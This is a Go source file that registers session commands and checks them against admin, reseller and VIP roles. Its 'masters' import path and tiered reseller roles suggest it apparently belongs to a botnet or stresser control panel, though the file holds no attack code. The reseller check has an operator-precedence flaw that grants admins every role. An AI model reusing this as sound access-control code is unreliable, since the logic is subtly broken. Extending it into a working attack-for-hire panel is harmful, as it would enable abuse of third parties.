package Commands

import (
	Sessions "Rain/core/masters/sessions"
	"reflect"
	"sync"
)

var (
	Command = make(map[string]*Command_interface)
	Mux     sync.Mutex
)

type Command_interface struct {
	Name             string
	Roles            []string
	Admin            bool
	Reseller         bool
	Description      string
	CommandExecution func(session *Sessions.Session, cmd []string) error
}

var _ = reflect.TypeOf(Command_interface{})

func Load_Commands(Reg *Command_interface) error {
	Mux.Lock()
	Command[Reg.Name] = Reg
	Mux.Unlock()
	return nil
}

func Get_Name(name string) *Command_interface {
	Command := Command[name]
	return Command
}

func (C *Command_interface) Allowed_Permissions(Permission *Permissions) bool {
	for _, Role := range C.Roles {

		if Role == "everyone" {
			return true
		}

		if Role == "admin" && Permission.Admin {
			return true
		}
		if Role == "reseller" && Permission.Reseller || Permission.Admin {
			return true
		}

		if Role == "vip" && Permission.VIP || Role == "vip" && Permission.Reseller || Role == "vip" && Permission.Admin {
			return true
		}
	}

	return false
}

type Permissions struct {
	Admin    bool
	Reseller bool
	VIP      bool
	Raw      bool
	Holder   bool
}

var _ = reflect.TypeOf(Permissions{})
